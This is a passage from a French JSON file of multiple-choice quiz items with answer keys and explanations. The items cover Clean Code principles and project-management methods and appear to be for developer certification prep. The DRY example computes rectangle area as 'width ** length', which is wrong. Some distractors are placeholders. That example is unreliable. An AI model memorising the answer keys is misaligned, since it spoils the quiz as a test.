            "explanation": "L' Inversion of Control (IoC) (ou inversion de contrôle) est un principe de conception qui inverse le flux de contrôle d'un programme.\n\nAu lieu que le programme principal contrôle le flux d'exécution, ce sont des frameworks ou des conteneurs qui gèrent le flux, permettant ainsi de déléguer certaines responsabilités.\nIoC est souvent associé à la programmation orientée objet (POO) car il favorise la modularité et la réutilisation du code.\n\nPar exemple, dans le cadre de l'injection de dépendances, un objet ne crée pas ses dépendances directement, mais les reçoit de l'extérieur, ce qui facilite les tests et la maintenance. \n\nExemple sans IoC :\npublic class UserService {\n    private Database database;\n\n    // Dépendance créée directement\n    public UserService() {\n        this.database = new MySQLDatabase();\n    }\n\n    public void saveUser(User user) {\n        database.save(user);\n    }\n} \n\nExemple avec IoC :\npublic class UserService {\n    private Database database;\n\n    // Injection de dépendance\n    public UserService(Database database) {\n        this.database = database;\n    }\n\n    public void saveUser(User user) {\n        database.save(user);\n    }\n}\n\n// Utilisation\nDatabase database = new MySQLDatabase();\nUserService userService = new UserService(database);"
        },
        {
            "theme": "Le Clean Code",
            "question": "Qu'est-ce que le principe de Separation of Concern (SoC) ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Le principe de Separation of Concern (SoC) (ou séparation des préoccupations) stipule qu'un programme doit être divisé en sections distinctes...",
                "Une technique qui regroupe les différentes couches d'une application pour simplifier le code",
                "Une méthode pour stocker les préoccupations des utilisateurs dans la base de données",
                "Une pratique consistant à regrouper toutes les fonctions dans un seul module"
            ],
            "correct": 0,
            "explanation": "Le principe de Separation of Concern (SoC) (ou séparation des préoccupations) stipule qu'un programme doit être divisé en sections distinctes, chacune gérant une préoccupation ou une fonctionnalité spécifique.\n\nCela permet de réduire la complexité et d'améliorer la maintenabilité du code.\nEn appliquant le SoC, les développeurs peuvent travailler sur différentes parties d'un système sans interférer avec d'autres, ce qui facilite les tests, les mises à jour et la collaboration.\n\nPar exemple, dans une application web, la logique de présentation, la logique métier et l'accès aux données peuvent être séparés en différentes couches.\n\nExemple sans SoC :\npublic class UserManager {\n    public void createUser(String username) {\n        // Business logic\n        String userId = \"USER_\" + username.toLowerCase();\n\n        // Data access\n        System.out.println(\"Saving user to database: \" + userId + \", \" + username);\n\n        // Logging\n        System.out.println(\"User created: \" + username);\n    }\n} \n\nExemple avec SoC :\n// Business Object (BO)\npublic class User {\n    private String userId;\n    private String username;\n\n    public User(String userId, String username) {\n        this.userId = userId;\n        this.username = username;\n    }\n\n    // Getters and setters\n}\n\n// Data Access Layer (DAL)\npublic class UserDAL {\n    public void saveUser(User user) {\n        // Simulating database access\n        System.out.println(\n            \"Saving user to database: \" +\n            user.getUserId() + \", \" +\n            user.getUsername());\n    }\n}\n\n// Business Logic Layer (BLL)\npublic class UserService {\n    private UserDAL UserDAL;\n\n    public UserService(UserDAL UserDAL) {\n        this.UserDAL = UserDAL;\n    }\n\n    public void createUser(String username) {\n        String userId = \"USER_\" + username.toLowerCase();\n        User user = new User(userId, username);\n        UserDAL.saveUser(user);\n        System.out.println(\"User created: \" + username);\n    }\n}"
        },
        {
            "theme": "Le Clean Code",
            "question": "Qu'est-ce que le principe DRY ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Le principe Don't Repeat Yourself (DRY) (ou 'ne te répète pas) stipule qu'une information ou une logique ne doit pas être répétée dans le code",
                "Un principe visant à commenter le code à chaque répétition d’instruction",
                "Une règle de performance qui interdit les boucles imbriquées",
                "Une pratique consistant à écrire le même code dans plusieurs fichiers pour plus de sûreté"
            ],
            "correct": 0,
            "explanation": "Le principe Don't Repeat Yourself (DRY) (ou 'ne te répète pas) stipule qu'une information ou une logique ne doit pas être répétée dans le code.\nCela favorise la réutilisation et réduit les risques d'erreurs, car une modification dans une seule instance de code se répercute automatiquement partout où elle est utilisée.\n\nExemple non-DRY en <b>Python</b>:\ndef calculate_square_area(side):\n    surface_area = side ** 2\n    print('-------------------------------------')\n    print(\"L'aire que vous avez demandé est de :\")\n    print(f\"Aire = {surface_area:.2f}\")\n\ndef calculate_rectangular_area(width, length):\n    surface_area = width ** length\n    print('-------------------------------------')\n    print(\"L'aire que vous avez demandé est de :\")\n    print(f\"Aire = {surface_area:.2f}\")\n\n# Utilisation\ncalculate_square_area(5)\ncalculate_rectangular_area(2, 5)\n\nExemple DRY en <b>Python</b> :\n def print_area(value):\n    print('-------------------------------------')\n    print(\"L'aire que vous avez demandé est de :\")\n    print(f\"Aire = {value:.2f}\")\n\ndef calculate_square_area(side):\n    surface_area = side ** 2\n    print_area(surface_area)\n\ndef calculate_rectangular_area(width, length):\n    surface_area = width ** length\n    print_area(surface_area)\n\n# Utilisation\ncalculate_square_area(5)\ncalculate_rectangular_area(2, 5)"
        },
        {
            "theme": "Le Clean Code",
            "question": "Qu'est-ce que le principe KISS ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Un concept d’interface utilisateur basée sur des interactions simples",
                "Un principe de sécurité pour éviter les failles dans le code",
                "Une approche pour condenser le code en une seule ligne",
                "Le principe Keep It Simple, Stupid (KISS) (ou 'garde ça simple et idiot') encourage les développeurs à garder le code aussi simple que possible"
            ],
            "correct": 3,
            "explanation": "Le principe Keep It Simple, Stupid (KISS) (ou 'garde ça simple et idiot') encourage les développeurs à garder le code aussi simple que possible.\nCela signifie éviter les complexités inutiles et privilégier des solutions simples et compréhensibles, facilitant ainsi la maintenance et la collaboration.\n\nExemple non-KISS (trop complexe) :\ndef is_even(number):\n    if number == 0:\n        return True\n    elif number == 1:\n        return False\n    else:\n        return is_even(abs(number) - 2)\n\n# Utilisation\nprint(is_even(4))  # True\nprint(is_even(7))  # False \n\nExemple KISS (simple et efficace) :\ndef is_even(number):\n    return number % 2 == 0\n\n# Utilisation\nprint(is_even(4))  # True\nprint(is_even(7))  # False"
        },
        {
            "theme": "Le Clean Code",
            "question": "Qu'est-ce que le principe YAGNI ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Une réponse aléatoire A",
                "Le principe You Aren't Gonna Need It (YAGNI) (ou 'tu n'en auras pas besoin') suggère que les développeurs ne doivent pas ajouter de fonctionnalités tant qu'elles ne sont pas nécessaires",
                "Une réponse aléatoire C",
                "Une réponse aléatoire B"
            ],
            "correct": 1,
            "explanation": "Le principe You Aren't Gonna Need It (YAGNI) (ou 'tu n'en auras pas besoin') suggère que les développeurs ne doivent pas ajouter de fonctionnalités tant qu'elles ne sont pas nécessaires.\nCela aide à éviter la surcharge de fonctionnalités et à se concentrer sur les besoins réels du projet.\n\nExemple non-YAGNI (surengineering) :\nclass UserProfile:\n    def __init__(self, name, email):\n        self.name = name\n        self.email = email\n\n        # Pour les préférences\n        self.preferences = {}\n\n        # Pour les liens\n        self.social_media = []\n\n        # Pour des récompenses\n        self.achievements = [] \n\nExemple YAGNI (simple et suffisant) :\nclass UserProfile:\n    def __init__(self, name, email):\n        self.name = name\n        self.email = email"
        },
        {
            "theme": "Le Clean Code",
            "question": "Pourquoi est-il important d'écrire du code lisible pour les autres développeurs ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Parce que cela rend le code plus lent mais plus esthétique",
                "Parce que le code sera plus facile à maintenir, à corriger et à faire évoluer dans le temps",
                "Parce que cela augmente la taille du projet et impressionne les managers",
                "Parce que cela rend inutile la documentation"
            ],
            "correct": 1,
            "explanation": "La lisibilité du code est essentielle, car un programme n'est pas seulement écrit pour être exécuté par une machine, mais également pour être compris par d'autres humains.\nUn code lisible facilite la maintenance, la correction des bugs et l'évolution du projet.\n\nDans une équipe, plusieurs développeurs peuvent être amenés à modifier la même base de code.\nSi celle-ci est claire, bien nommée et correctement structurée, cela réduit les risques d'erreurs et améliore la productivité globale.\n\nLe Clean Code insiste donc sur la clarté, la cohérence et la simplicité avant la 'performance esthétique' ou la complexité technique inutile."
        },
        {
            "theme": "Le Clean Code",
            "question": "Que signifie la notion de 'refactoring' dans le Clean Code ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "C'est le processus consistant à réécrire totalement une application",
                "C'est la suppression des tests unitaires pour gagner du temps",
                "C'est l'amélioration du code existant sans en changer le comportement externe",
                "C'est le remplacement du code par des bibliothèques tierces"
            ],
            "correct": 2,
            "explanation": "Le refactoring désigne le processus d'amélioration du code sans en modifier le comportement visible.\nL’objectif est d’optimiser la structure interne du code pour le rendre plus clair, plus performant et plus facile à maintenir.\n\nCela peut inclure la simplification de méthodes complexes, la suppression de duplications, ou encore le renommage de variables et de fonctions pour les rendre plus explicites.\n\nPar exemple, dans un projet Python, un développeur peut refactoriser une fonction de 50 lignes en plusieurs fonctions cohérentes, chacune ayant une seule responsabilité.\nCette pratique est au cœur du Clean Code, car elle garantit un code durable et évolutif."
        },
        {
            "theme": "Le Clean Code",
            "question": "Qu'est-ce qu'un 'code smell' ? ",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un code parfaitement optimisé",
                "Une anomalie visuelle dans l'éditeur de code",
                "Un signe qu'une partie du code pourrait être mal conçue ou difficile à maintenir",
                "Une erreur de compilation courante"
            ],
            "correct": 2,
            "explanation": "Un 'code smell' (ou 'mauvaise odeur de code') est un terme utilisé pour désigner un signe révélateur qu'une partie du code pourrait être problématique, même si elle fonctionne correctement.\n\nCela indique souvent un design sous-optimal ou une dette technique à corriger.\n\nExemples de code smells :\ndes fonctions trop longues, des classes ayant trop de responsabilités, des duplications de code ou encore des noms de variables ambigus.\nLe Clean Code encourage à identifier et corriger ces mauvaises odeurs par des refactorings réguliers afin de préserver la santé du code sur le long terme."
        },
        {
            "theme": "Le Clean Code",
            "question": "Pourquoi les commentaires excessifs peuvent nuire au Clean Code ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Parce qu'ils rendent le code plus long à lire et peuvent masquer un manque de clarté",
                "Parce qu'ils empêchent la compilation du programme",
                "Parce qu'ils ralentissent l’exécution du code",
                "Parce qu’ils sont interdits par les bonnes pratiques"
            ],
            "correct": 0,
            "explanation": "Les commentaires sont utiles lorsqu'ils expliquent une intention complexe, mais leur utilisation excessive peut nuire à la lisibilité globale.\nSi un code nécessite de nombreux commentaires pour être compris, cela révèle souvent qu’il manque de clarté ou qu’il n’est pas suffisamment explicite par lui-même.\n\nLe Clean Code privilégie un code auto-documenté, où les noms de variables, fonctions et classes sont suffisamment explicites pour transmettre leur rôle.\nLes bons commentaires doivent être exceptionnels et expliquer le 'pourquoi', pas le 'comment'."
        },
        {
            "theme": "Le Clean Code",
            "question": "Quelle est la différence entre la complexité essentielle et la complexité accidentelle ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "La complexité essentielle est liée à la nature du problème, tandis que la complexité accidentelle provient d'une mauvaise conception ou implémentation",
                "Elles sont identiques et toutes deux inévitables",
                "La complexité accidentelle vient du manque de documentation uniquement",
                "La complexité essentielle dépend uniquement du langage de programmation"
            ],
            "correct": 0,
            "explanation": "La complexité essentielle est inhérente au problème à résoudre\n— elle fait partie de la nature même du domaine (par exemple, la gestion de la sécurité ou des transactions bancaires).\nLa complexité accidentelle, quant à elle, résulte des choix techniques ou de conception inappropriés qui compliquent inutilement le code (par exemple, une architecture trop rigide, des noms confus ou des dépendances mal gérées).\n\nLe Clean Code vise à réduire cette complexité accidentelle pour rendre le système plus simple et maintenable sans altérer la logique métier sous-jacente."
        },
        {
            "theme": "Le Clean Code",
            "question": "Pourquoi est-il essentiel d'anticiper et d'implémenter les tests et cas d'erreurs au fur et à mesure du développement d'une application ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Pour ralentir volontairement le cycle de livraison afin de peaufiner le design.",
                "Car le premier bug sur mobile peut mener à une désinstallation immédiate, il faut donc noter et implémenter les tests dès qu'on y pense.",
                "Parce que les tests ne doivent être écrits qu'après la mise en production complète par l'équipe QA.",
                "Uniquement pour remplir les critères de couverture de code imposés par les outils d'analyse statique."
            ],
            "correct": 1,
            "explanation": "Les applications mobiles ou web subissent une forte concurrence. Un seul bug peut pousser l'utilisateur à désinstaller ou quitter définitivement l'application. Il est donc recommandé d'anticiper, de noter les cas d'erreur et les tests dès qu'on y pense, et de les implémenter au fil de l'eau."
        },
        {
            "theme": "Le Clean Code",
            "question": "Pourquoi doit-on éviter le mélange de langues (français et anglais) dans le code source et les schémas d'un projet ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Pour éviter les avertissements de compilation des langages de programmation modernes.",
                "Pour maintenir la cohérence, la lisibilité et faciliter la maintenance du projet par d'autres développeurs.",
                "Parce que les bases de données relationnelles ne supportent pas l'indexation de mots dans deux langues différentes.",
                "Uniquement pour respecter les obligations légales de la loi Toubon sur l'usage du français."
            ],
            "correct": 1,
            "explanation": "Le mélange de langues (comme nommer une fonction en français et ses variables en anglais) nuit gravement à la lisibilité et à la cohérence du code. Pour un projet professionnel, il est recommandé de choisir une seule langue (généralement l'anglais) pour l'intégralité du code et des schémas techniques."
        },
        {
            "theme": "Le Clean Code",
            "question": "Qu'est-ce que l'injection de dépendances ?",
            "level": "Avancé",
            "filiere": "CDA",
            "answers": [
                "Fournir à un objet ses dépendances depuis l'extérieur (constructeur, setter) au lieu de les créer lui-même, ce qui réduit le couplage et facilite les tests",
                "Injecter des erreurs dans le code pour vérifier sa solidité",
                "Une technique de compression des dépendances pour accélérer l'installation",
                "Une méthode pour qu'une classe crée elle-même tous les objets dont elle a besoin en interne"
            ],
            "correct": 0,
            "explanation": "Problème : si un service fait new MySQLDatabase() en dur, impossible de le tester sans vraie base ni de changer de SGBD.\nSolution : injecter la dépendance, le plus souvent par le constructeur :\nclass UserService {\n    constructor(userRepository) { this.repo = userRepository; }\n}\nBénéfices :\n- couplage faible : la classe dépend d'une abstraction, pas d'une implémentation (Dependency Inversion Principle) ;\n- testabilité : on injecte un mock dans les tests ;\n- flexibilité : on change l'implémentation sans toucher au consommateur.\nLa mise en oeuvre à grande échelle est automatisée par un conteneur IoC (frameworks : Symfony, Angular, Spring)."
        },
        {
            "theme": "Le Clean Code",
            "question": "Pourquoi utiliser un conteneur IoC ?",
            "level": "Avancé",
            "filiere": "CDA",
            "answers": [
                "Pour supprimer le besoin d'écrire la logique métier",
                "Pour exécuter le code dans un environnement virtualisé plus rapide",
                "Pour stocker les mots de passe de l'application",
                "Pour automatiser la création et le câblage des objets : le conteneur instancie les classes, résout leurs dépendances et gère leur cycle de vie, évitant les 'new' en cascade et favorisant le couplage faible"
            ],
            "correct": 3,
            "explanation": "Un conteneur IoC (Inversion of Control) prend en charge l'assemblage :\n- on déclare les classes et leurs dépendances (configuration, autowiring) ;\n- à l'exécution, le conteneur construit le graphe d'objets : UserService <- UserRepository <- Connexion ;\n- il gère aussi le cycle de vie (singleton, une instance par requête...).\nAvantages : moins de code de câblage, configuration centralisée, remplacement d'implémentation sans toucher au code, cohérence de l'ensemble.\nExemples : conteneur de services Symfony, injection Angular, Spring.\nSans conteneur, l'injection manuelle devient vite lourde dès que le projet compte beaucoup de services."
        },
        {
            "theme": "Le Clean Code",
            "question": "Qu'est-ce que la dette technique ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "L'ensemble des choix de facilité pris pour aller vite (code dupliqué, tests absents, structure approximative) qui ralentiront les évolutions futures, et qu'il faudra 'rembourser' par du refactoring",
                "Le budget restant à la fin du projet",
                "Les licences à payer pour les dépendances open source",
                "Un type d'erreur de compilation en Java"
            ],
            "correct": 0,
            "explanation": "Métaphore de Ward Cunningham : comme une dette financière, un raccourci technique permet d'avancer maintenant, mais génère des intérêts - chaque évolution devient plus lente et plus risquée - jusqu'au remboursement.\nSources typiques : délais serrés, absence de tests, duplication, structure datée, dépendances obsolètes.\nGestion attendue :\n1. l'identifier : code smells, SonarQube, revues ;\n2. la chiffrer et la prioriser comme n'importe quel travail ;\n3. la rembourser progressivement : refactoring continu, 'règle du boy scout' (laisser le code plus propre qu'on ne l'a trouvé).\nEn oral, savoir citer une dette réelle de son projet et comment on l'a traitée est très valorisé."
        },
        {
            "theme": "Le Clean Code",
            "question": "Comment garantissez-vous la maintenabilité de votre application ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "En écrivant tout le code dans un seul fichier pour éviter de chercher",
                "En supprimant les commentaires et la documentation pour alléger le projet",
                "En refusant toute modification du code après la livraison",
                "Par une séparation claire des responsabilités, un nommage cohérent, des fonctions courtes, des tests automatisés qui protègent les refactoring, la suppression de la duplication (DRY) et une documentation à jour"
            ],
            "correct": 3,
            "explanation": "Maintenabilité = capacité à faire évoluer le code sans régression et à coût maîtrisé.\nLeviers concrets :\n- architecture en couches avec responsabilités claires (SRP) ;\n- nommage explicite et cohérent, fonctions courtes avec un seul niveau d'abstraction ;\n- DRY/KISS : pas de duplication, pas de sur-ingénierie ;\n- tests automatisés : filet de sécurité qui rend les refactoring possibles ;\n- conventions d'équipe (style guide, linter, revues de code) ;\n- outillage qualité : SonarQube, analyse de couverture.\nIndicateur pragmatique : le temps nécessaire pour ajouter une fonctionnalité ou corriger un bug sans en créer d'autres."
        },
        {
            "theme": "Le Clean Code",
            "question": "À quoi sert SonarQube ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "À gérer les mots de passe de l'application",
                "À analyser automatiquement le code source pour détecter bugs, code smells, vulnérabilités et duplication, et suivre la dette technique via un tableau de bord qualité",
                "À déployer l'application sur le serveur de production",
                "À créer des maquettes d'interface à partir du code"
            ],
            "correct": 1,
            "explanation": "SonarQube est une plateforme d'analyse statique de code (Java, PHP, JavaScript, Python...) :\n- bugs potentiels (comparaisons douteuses, valeurs nulles) ;\n- code smells : complexité excessive, duplication, méthodes trop longues ;\n- vulnérabilités de sécurité ;\n- couverture des tests.\nIl propose un tableau de bord avec des 'quality gates' : un build peut être bloqué si les seuils ne sont pas respectés, et il s'intègre dans les pipelines CI/CD.\nEn entretien : savoir dire ce qu'il mesure, comment on réagit à ses alertes (corriger, prioriser la dette), et pourquoi ça protège la qualité dans la durée."
        },
        {
            "theme": "Le Clean Code",
            "question": "Quelles conventions de développement appliquez-vous dans votre projet ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "Aucune : chaque développeur code comme il le souhaite, même dans le même fichier",
                "Uniquement des règles imposées par le client final, jamais lues par l'équipe",
                "Des conventions conservées secrètes pour sécuriser le code",
                "Des conventions de nommage cohérentes (camelCase/PascalCase selon le langage), une structure de projet standard, un style de code partagé (linter/formatter) et des règles Git (messages de commit, branches)"
            ],
            "correct": 3,
            "explanation": "Conventions typiques en équipe :\n- nommage : camelCase pour variables et fonctions, PascalCase pour les classes, SNAKE_CASE pour les constantes, noms en anglais ;\n- structure : dossiers organisés selon le découpage (MVC, couches) ;\n- formatage automatique : Prettier, PHP-CS-Fixer, Black, ESLint ;\n- Git : commits conventionnels (feat:, fix:), stratégie de branches, revues de code.\nIntérêt : le projet se lit comme s'il était écrit par une seule personne ; la reprise du code par un tiers (ou par soi-même six mois plus tard) est immédiate.\nEn oral, citer les conventions réellement appliquées dans le projet et leur justification, pas une liste générique."
        }
    ],
    "Le projet et les méthodes": [
        {
            "theme": "Le projet et les méthodes",
            "question": "Qu'est-ce qu'un diagramme de Gantt et comment l'utiliser ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "C'est un outil pour dessiner des diagrammes de flux d'information",
                "Une méthode pour planifier des réunions et échéances",
                "Un graphique qui permet de représenter les tâches en barres sur un calendrier",
                "Un diagramme de Gantt est un outil de gestion de projet qui permet de visualiser graphiquement l'avancement des différentes tâches d'un projet dans le temps"
            ],
            "correct": 3,
            "explanation": "Un diagramme de Gantt est un outil de gestion de projet qui permet de visualiser graphiquement l'avancement des différentes tâches d'un projet dans le temps.\nIl facilite ainsi la communication et permet d'identifier les goulots d'étranglement potentiels et d'optimier l'allocation des ressources.\nCependant, pour les projets complexes, il peut devenir difficile à gérer et à lire.\nDans ces cas, il est souvent combiné avec d'autres méthodes de gestion de projet pour une planification plus efficace.\nIl se présente sous forme d'un graphique à barres horizontales, où l'axe horizontal représente le temps et l'axe vertical liste les tâches du projet.\n\nPour utiliser efficacement un diagramme de Gantt, suivez ces étapes clés :\n\t- 1. Définir les tâches du projet\n\t- 2. Estimer la durée de chaque tâche\n\t- 3. Identifier les dépendances\n\t- 4. Créer le diagramme\n\t- 5. Attribuer les ressources\n\t- 6. Suivre l'avancement\n\t- 7. Ajuster si nécessaire"
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Qu'est-ce qu'un tableau Kanban ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un tableau Kanban est un outil visuel de gestion de projet qui permet de visualiser le flux de travail et d'optimiser la productivité",
                "C'est un outil pour créer des listes de tâches prioritaires",
                "Une méthode pour estimer la charge de travail des équipes",
                "Un calendrier pour planifier les deadlines de projets"
            ],
            "correct": 0,
            "explanation": "Un tableau Kanban est un outil visuel de gestion de projet qui permet de visualiser le flux de travail et d'optimiser la productivité.\nOriginaire du système de production Toyota, il s'est largement répandu dans divers domaines de gestion de projet, notamment dans le développement logiciel agile.\nLa structure typique d'un tableau Kanban comprend plusieurs colonnes représentant les différentes étapes du processus de travail, comme À faire , En cours et Terminé.\nDes cartes ou post-its représentant les tâches individuelles sont déplacées entre ces colonnes au fur et à mesure de leur progression.\nCela offre ainsi une vue d'ensemble claire de l'état du projet et permet de limiter au besoin le nombre de tâches simultanées, éviatant la surcharge et améliorant l'efficacité.\nPour utiliser efficacement un tableau Kanban :\n\t- 1. Définir clairement les étapes du processus de travail.\n\t- 2. Créer des cartes pour chaque tâche avec des informations essentielles.\n\t- 3. Établir des limites de WIP pour chaque colonne.\n\t- 4. Déplacer les cartes au fur et à mesure de l'avancement des tâches.\n\t- 5. Analyser régulièrement le flux pour identifier les goulots d'étranglement.\n\t- 6. Ajuster le processus en fonction des observations pour une amélioration continue."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Qu'est-ce que la méthode Agile ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "La méthode Agile est une approche itérative et collaborative de gestion de projet, particulièrement utilisée dans le développement logiciel",
                "Une approche qui planifie tout le projet de A à Z avant de commencer",
                "Un style de management où le chef de projet prend toutes les décisions",
                "Une méthode qui ne s'applique qu'aux projets informatiques très simples"
            ],
            "correct": 0,
            "explanation": "La méthode Agile est une approche itérative et collaborative de gestion de projet, particulièrement utilisée dans le développement logiciel.\nElle se caractérise par sa flexibilité et son adaptabilité aux changements.\n\t1. Définition : Une approche qui prend en compte les besoins initiaux du client et leurs évolutions tout au long du projet.\nElle se base sur des cycles de développement courts appelés 'sprints', permettant des livraisons fréquentes de fonctionnalités utilisables.\n\t2. Principes fondamentaux : Issus du Manifeste Agile de 2001, ils mettent l'accent sur les individus et leurs interactions, les logiciels opérationnels, la collaboration avec les clients, et l'adaptation au changement.\n\t3. Caractéristiques clés : Travail en équipes auto-organisées et pluridisciplinaires, communication constante avec les parties prenantes, planification adaptative, et amélioration continue.\n\t4. Méthodologies populaires : Scrum, Kanban, et Extreme Programming (XP) sont parmi les frameworks Agiles les plus utilisés.\n\t5. Avantages : Meilleure satisfaction client, réduction des risques grâce aux feedbacks réguliers, flexibilité face aux changements, et amélioration de la productivité de l'équipe.\n\t6. Application : Bien que principalement utilisée dans le développement logiciel, la méthode Agile s'étend progressivement à d'autres domaines de gestion de projet. La méthode Agile représente un changement de paradigme par rapport aux approches traditionnelles de gestion de projet, en favorisant l'adaptabilité, la collaboration et la livraison de valeur continue au client."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Quels sont les 12 principes de la méthode Agile ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Ce sont 12 règles pour planifier toutes les tâches d'un projet avant le début du développement",
                "Un ensemble de directives pour exiger la documentation exhaustive à chaque étape",
                "12 étapes pour suivre un cycle en cascade classique",
                "La méthode Agile est constituée de 12 principes présentés dans le manifeste agile"
            ],
            "correct": 3,
            "explanation": "La méthode Agile est constituée de 12 principes présentés ci-dessous (Cf. Wikipedia).\n\t- Notre plus haute priorité est de satisfaire le client en livrant rapidement et régulièrement des fonctionnalités à grande valeur ajoutée.\n\t- Accueillez positivement les changements de besoins, même tard dans le projet.\nLes processus Agiles exploitent le changement pour donner un avantage compétitif au client.\n\t- Livrez fréquemment un logiciel fonctionnel, dans des cycles de quelques semaines à quelques mois, avec une préférence pour les plus courts.\n\t- Les utilisateurs ou leurs représentants et les développeurs doivent travailler ensemble quotidiennement tout au long du projet.\n\t- Réalisez les projets avec des personnes motivées.\nFournissez-leur l’environnement et le soutien dont elles ont besoin et faites-leur confiance pour atteindre les objectifs fixés.\n\t- La méthode la plus simple et la plus efficace pour transmettre de l’information à l'équipe de développement et à l’intérieur de celle-ci est le dialogue en face à face.\n\t- Un logiciel fonctionnel est la principale mesure de progression d'un projet.\n\t- Les processus agiles encouragent un rythme de développement soutenable.\nEnsemble, les commanditaires, les développeurs et les utilisateurs devraient être capables de maintenir indéfiniment un rythme constant.\n\t- Une attention continue à l'excellence technique et à un bon design.\n\t- La simplicité – c’est-à-dire l’art de minimiser la quantité de travail inutile – est essentielle.\n\t- Les meilleures architectures, spécifications et conceptions émergent d'équipes auto-organisées.\n\t- À intervalles réguliers, l'équipe réfléchit aux moyens possibles de devenir plus efficace.\nPuis elle s'adapte et modifie son fonctionnement en conséquence."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Comment fonctionne la méthode en V dans la gestion de projet ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "C'est une méthode où toutes les tâches sont planifiées simultanément puis exécutées ensemble",
                "Une approche où l'on commence par les tests pour remonter jusqu'à l'analyse",
                "Une méthode où les livrables sont créés puis intégrés dans n'importe quel ordre",
                "La méthode en V est un modèle de gestion de projet linéaire qui se caractérise par une séquence de phases bien définies"
            ],
            "correct": 3,
            "explanation": "La méthode en V est un modèle de gestion de projet linéaire qui se caractérise par une séquence de phases bien définies.\nElle est particulièrement utilisée dans le développement logiciel et l'ingénierie.\nLe cycle en V se compose d'une phase descendante de spécification et de conception, suivie d'une phase ascendante de test et de validation.\nChaque étape de conception a une étape correspondante de test.\n\nPar exemple, les spécifications fonctionnelles définies au début du projet sont vérifiées lors des tests fonctionnels à la fin.\nCette approche garantit que chaque exigence est validée avant de passer à l'étape suivante, ce qui minimise les risques d'erreurs.\nLa méthode en V est idéale pour les projets où les exigences sont bien définies et peu susceptibles de changer.\nElle offre une structure rigoureuse qui facilite la planification et le suivi du projet.\nCependant, sa nature linéaire peut rendre difficile l'adaptation aux changements imprévus, ce qui la rend moins flexible que les méthodologies agiles.\nPour utiliser efficacement la méthode en V, il est essentiel de bien définir les besoins dès le départ et de documenter chaque phase du projet.\nLes outils de gestion de projet peuvent aider à suivre l'avancement et à assurer que chaque phase est correctement validée avant de passer à la suivante."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Qu'est-ce que la méthode Merise ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "La méthode Merise est une méthode d'analyse, de conception et de gestion de projets informatiques, développée en France dans les années 70",
                "Une approche qui consiste à coder d'abord et à analyser ensuite",
                "Une méthode pour créer uniquement des diagrammes de flux sans structurer les données",
                "Un processus pour gérer exclusivement la documentation projet"
            ],
            "correct": 0,
            "explanation": "La méthode Merise est une méthode d'analyse, de conception et de gestion de projets informatiques, développée en France dans les années 70.\nElle est particulièrement utilisée pour le développement de systèmes d'information.\nL'objectif principal de Merise est d'analyser et de concevoir des systèmes d'information de manière structurée et méthodique.\nCette méthode adopte une approche systémique, analysant la structure à informatiser en matières de systèmes interconnectés.\nElle se concentre sur la modélisation des données et des traitements à différents niveaux d'abstraction.\nLa méthode se divise généralement en trois phases :\n\tl' analyse , la conception et la réalisation.\nDans la phase d'analyse , les besoins des utilisateurs sont identifiés et les données nécessaires au fonctionnement du système sont modélisées.\n\tLa phase de conception consiste à créer des modèles détaillés qui décrivent comment le système sera structuré et fonctionnera.\n\tEnfin, la phase de réalisation englobe le développement et la mise en œuvre du système.\n\nLa méthode Merise utilise des diagrammes tels que le modèle entité-association (pour représenter les données) et les diagrammes de flux (pour représenter les traitements), ce qui facilite la compréhension et la communication entre les parties prenantes du projet."
        },
        {
            "theme": "Le projet et les méthodes",
            "question": "Expliquez le concept d'architectures monolithiques",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Une architecture monolithique est un modèle traditionnel de développement logiciel où l'application est conçue comme une unité unifiée et autonome",
                "Une approche qui divise toutes les fonctionnalités en services totalement indépendants",
                "Un système où chaque utilisateur installe un module séparé",
                "Une méthode qui ne considère pas les dépendances entre composants"
            ],
            "correct": 0,
            "explanation": "Une architecture monolithique est un modèle traditionnel de développement logiciel où l'application est conçue comme une unité unifiée et autonome.\nDans cette approche, tous les composants et fonctionnalités sont intégrés dans un seul programme, créant un système où les différentes parties sont fortement interdépendantes.\nLes caractéristiques principales des architectures monolithiques incluent une base de code unique, un déploiement en tant qu'unité unique, et un couplage étroit entre les composants.\nCette structure peut simplifier le développement initial, le débogage et les tests, car tout est centralisé dans un seul endroit.\nCependant, à mesure que l'application grandit en taille et en complexité, les architectures monolithiques peuvent présenter des défis.\nLes modifications, même mineures, nécessitent souvent de recompiler et de redéployer l'ensemble de l'application.\nCela peut rendre les mises à jour et la maintenance plus complexes et chronophages.\nL'évolutivité est un autre point critique des architectures monolithiques.\nLorsqu'une partie de l'application nécessite plus de ressources, c'est l'ensemble du système qui doit être mis à l'échelle, ce qui peut être inefficace en termes de ressources et de coûts.\n\nBien que les architectures monolithiques puissent être efficaces pour des applications simples ou dans les premières phases d'un projet, elles peuvent poser des défis en termes de flexibilité et d'évolutivité à long 